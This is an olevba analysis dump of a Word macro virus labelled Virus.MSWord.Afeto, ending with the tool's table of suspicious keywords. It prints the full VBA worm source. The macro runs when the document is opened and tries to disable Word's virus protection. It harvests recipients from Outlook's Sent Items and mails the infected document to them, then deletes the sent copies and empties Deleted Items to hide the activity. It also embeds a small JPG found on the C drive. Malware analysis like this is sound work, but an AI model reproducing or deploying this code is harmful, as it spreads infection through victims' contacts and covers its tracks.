olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Afeto
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Afeto - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
  Dim A1 As Object, A2 As Object, A3 As Object, A8 As Object
  Dim A4 As Object, A5 As Object, A6 As Object, A7 As Object
  Dim B1 As Object, B2 As Object
  F1 = Chr(79) + "ptions.VirusProtection"
 ' F2 = chr(79) + "ptions.SaveNormalPrompt"
 ' F3 = chr(79) + "ptions.ConfirmConversions"
  F1 = False
 ' F2 = False
 ' F3 = False
 ' Application.ScreenUpdating = False
  On Error GoTo Fora
  Set A1 = CreateObject("Outlook.Application")
 ' Set A2 = A1.CreateItem(olMailItem)
  Set A4 = A1.GetNamespace("MAPI")
  Set A5 = A4.GetDefaultFolder(olFolderSentMail)
  Set A6 = A5.Items
  Acha_Gif
  
  Call Escolhe(teupath)
  Zf = A6.Item(1).To
  W1 = teupath & Right(Left(Zf, 6), 5) & ".doc"
 ' T4 = Right(Left(Z, 6), 5) & ".doc"
 For n = 2 To 9
  W2 = A6.Item(n).Subject
  W3 = A6.Item(n).Body
  Z = A6.Item(n - 1).To
   If n = 2 Then
    ActiveDocument.SaveAs FileName:=W1, FileFormat:=wdFormatDocument, _
        LockComments:=False, Password:="", AddToRecentFiles:=True, WritePassword _
        :="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
        SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False
   End If
    Z1 = Len(Z)
    Y = ""
    For I = 1 To Z1 + 1
      Z2 = Right(Left(Z, I), 1)

      If Z2 = ";" Or Len(M) > Z1 - 1 Then
       If Y <> "" Then
        'A2.Recipients.Add (Y)
        Set A2 = A1.CreateItem(olMailItem)
         With A2
           .Subject = W2
           .Body = W3
           .Recipients.Add (Y)
            
         End With
       
         Set A3 = A2.Attachments
         A3.Add W1
         A2.Send
         Set A7 = A4.GetDefaultFolder(olFolderSentMail)
         Set A8 = A7.Items
         A8.Item(1).Delete
         Set A2 = Nothing
     
      '  Exit For
        Y = ""
       End If
        
      End If
      If I > Z1 Then
       
         Foda = 1
       
      Else
       If Z2 <> "'" Then
         If Z2 <> ";" Then
          Y = Y + Z2
          M = Y
         End If
       End If
      End If
    Next
  Next
  If Foda = 1 Then
        
         Set B1 = A4.GetDefaultFolder(olFolderDeletedItems)
         Set B2 = B1.Items
         Con = B2.Count
         For j = 1 To Con - 1
           B2.Item(j).Delete
         Next
  End If
Fora:
  Set A1 = Nothing
End Sub

Function Escolhe(XC)
  Dim W()
  ReDim W(7)
  
  W(1) = "I"
  W(2) = "H"
  W(3) = "G"
  W(4) = "F"
  W(5) = "E"
  W(6) = "D"
  W(7) = "C"
  K = 1
  On Error GoTo Inicio
    ChDrive W(K)
    XC = W(K) & ":\"
    Exit Function
  
Inicio:
     K = K + 1
     Resume
  
End Function

Sub Acha_Gif()
 
  Set Rs = Application.ActiveDocument
On Error GoTo Semanda
If FileLen(Rs.Name) < 200000 Then
  Set Fs = Application.FileSearch
  Meupath = "C:\"
  TesteX = 0
  Teunome = Dir(Meupath, vbDirectory)
  Do While Teunome <> ""
  TesteX = 0
  If Teunome <> "." And Teunome <> ".." Then
    If (GetAttr(Meupath & Teunome) And vbDirectory) = vbDirectory Then
    ' MsgBox "Teu Diretorio " & Meupath & teunome
     FQ = Meupath & Teunome
     Fs.LookIn = FQ
     Fs.FileName = "*.jpg"
     
     If Fs.Execute(SortBy:=msoSortByFileName, _
            SortOrder:=msoSortOrderAscending) > 0 Then
        Fi = Fs.FoundFiles.Count
        For I = 1 To Fs.FoundFiles.Count
          Fw = Fs.FoundFiles(I)
          Fe = FileLen(Fs.FoundFiles(I))
          If Fe < 50000 Then
          If Right(Fw, 4) = ".jpg" Then
              Selection.InlineShapes.AddPicture FileName:=Fw, _
           LinkToFile:=False, SaveWithDocument:=True
             TesteX = 1
             Exit For
          End If
          End If
        Next
     End If
    End If
  End If
  Teunome = Dir()
  If TesteX = 1 Then
    Exit Do
  End If
Loop
Else
  For b = 1 To 6
    Selection.TypeBackspace
  Next
End If
Semanda:
   ' Selection.EscapeKey
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

